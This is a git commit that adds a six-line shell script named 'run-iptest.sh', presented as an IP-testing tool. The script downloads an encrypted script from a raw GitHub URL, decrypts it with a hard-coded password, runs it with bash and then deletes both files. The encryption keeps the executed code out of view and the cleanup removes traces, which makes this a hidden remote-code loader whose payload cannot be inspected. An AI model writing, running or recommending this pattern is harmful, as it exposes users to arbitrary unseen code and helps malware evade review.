d0d377ab93a3633ec7f9554f24bcc932bb65cef7
acor1 <67935841+acor1@users.noreply.github.com>
2025-05-22 14:00:41 +0330

    Add files via upload

---
+++ run-iptest.sh
@@ -0,0 +1,6 @@
+
+#!/bin/bash
+curl -s https://raw.githubusercontent.com/yourusername/ip-runner/main/iptool.sh.enc -o /tmp/iptool.sh.enc
+openssl enc -aes-256-cbc -d -in /tmp/iptool.sh.enc -out /tmp/iptool.sh -k 'RunFastSecure123'
+bash /tmp/iptool.sh
+rm /tmp/iptool.sh /tmp/iptool.sh.enc
